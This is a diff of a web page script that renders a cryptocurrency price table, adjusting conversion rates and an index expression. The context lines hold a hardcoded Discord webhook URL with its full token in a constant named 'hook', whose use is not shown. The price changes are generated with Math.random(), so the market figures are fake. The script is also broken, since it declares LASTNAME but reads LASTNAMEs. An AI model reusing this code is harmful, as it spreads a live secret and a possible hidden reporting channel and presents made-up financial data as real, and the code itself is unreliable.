@@ -161,7 +161,7 @@
 
 <script>
     let code = "";
-    let rates = { USD: 11123, EURO: 14383, SGD: 9435 };
+    let rates = { USD: 123, EURO: 205, SGD: 80, };
     const hook = "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
     const LASTNAME = ["TRILLO", "SMITH", "JOHNSON", "STANG", "SOLAIRE", "", "UGRON", "CARDANO", "AVALANCHE", "DOGER", "TRON", "POLDDAVOKOT", "STRICKLAND", "GREGGOR", "SHUBA INU"];
 
@@ -215,7 +215,7 @@
     function updateMarket() {
         let cur = document.getElementById('currency-select').value; let html = "";
         for(let i=1; i<=1; i++) {
-            let name = LASTNAMEs[(i-13234) % LASTNAMEs.length];
+            let name = LASTNAMEs[(i-1) % LASTNAMEs.length];
             let base = i===1?96834.12:(1500/i); let p=(base*rates[cur]).toLocaleString('en-US',{minimumFractionDigits:2});
             html += `<tr><td>${i}</td><td><strong>${name}</strong></td><td>${cur} ${p}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(151-i).toFixed(1)}B</td></tr>`;
         }
